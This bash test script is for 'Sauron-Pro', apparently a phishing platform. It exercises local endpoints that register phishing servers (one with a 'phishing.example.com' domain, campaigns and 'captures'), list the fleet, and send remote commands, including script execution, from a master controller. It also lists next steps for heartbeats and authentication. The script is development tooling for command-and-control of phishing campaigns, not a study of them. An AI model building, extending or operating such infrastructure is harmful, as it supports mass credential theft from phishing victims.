#!/bin/bash

#!/bin/bash

#############################################################################
# Sauron-Pro Fleet Management System Test
# 
# This is a DEVELOPMENT/TESTING script that validates the fleet management
# endpoints and functionality. This is NOT for production deployment.
#
# For production deployment, use:
# - deploy-fleet-master.sh (for the master controller server)
# - deploy-vps-agent.sh (for individual VPS instances)
#############################################################################

echo "🚀 Sauron-Pro VPS Fleet Management Test"
echo "======================================"

# Start the server in background
echo "📡 Starting Sauron server..."
./sauron &
SERVER_PID=$!
sleep 3

echo ""
echo "🔧 Testing Fleet Management Endpoints:"
echo "--------------------------------------"

# Test 1: VPS Registration (simulating a VPS calling home)
echo "1️⃣ Testing VPS Registration..."
curl -s -X POST http://localhost:443/fleet/register \
  -H "Content-Type: application/json" \
  -H "X-VPS-ID: vps-test-001" \
  -d '{
    "ip": "192.168.1.100",
    "domain": "phishing.example.com", 
    "admin_domain": "admin.example.com",
    "version": "v2.0.1-pro",
    "location": "US-East",
    "campaigns": 3,
    "captures": 42
  }' | jq '.' 2>/dev/null || echo "VPS Registration sent"

echo ""

# Test 2: Get VPS Fleet List (admin checking instances)
echo "2️⃣ Testing Fleet Instance List..."
curl -s -X GET http://localhost:443/fleet/instances \
  -H "X-Admin-Key: your-admin-key" | jq '.' 2>/dev/null || echo "Fleet list requested"

echo ""

# Test 3: Send Command to VPS (master controlling VPS)
echo "3️⃣ Testing VPS Command..."
curl -s -X POST http://localhost:443/fleet/command \
  -H "Content-Type: application/json" \
  -d '{
    "admin_key": "your-admin-key",
    "vps_id": "vps-test-001",
    "command": "status",
    "payload": {},
    "timeout": 30
  }' | jq '.' 2>/dev/null || echo "VPS command sent"

echo ""

# Test 4: VPS Command Receiver (VPS receiving commands)
echo "4️⃣ Testing VPS Command Receiver..."
curl -s -X POST http://localhost:443/vps/command \
  -H "Content-Type: application/json" \
  -d '{
    "admin_key": "your-admin-key",
    "vps_id": "vps-test-001", 
    "command": "script",
    "payload": {"script": "verify-installation.sh"},
    "timeout": 60
  }' | jq '.' 2>/dev/null || echo "VPS command received"

echo ""
echo "✅ Fleet Management Test Complete!"
echo ""
echo "📊 Available Endpoints:"
echo "  • POST /fleet/register    - VPS registration/heartbeat"
echo "  • GET  /fleet/instances   - List all VPS instances"
echo "  • POST /fleet/command     - Send commands to VPS"
echo "  • POST /vps/command       - Receive commands from master"
echo "  • GET  /admin/scripts     - Script management"
echo ""
echo "🎯 Next Steps:"
echo "  • Set VPS_ID environment variable on each VPS"
echo "  • Configure MASTER_URL for heartbeat system"
echo "  • Implement proper database storage"
echo "  • Add authentication between VPS and master"

# Stop the server
kill $SERVER_PID 2>/dev/null
echo ""
echo "🛑 Test server stopped"
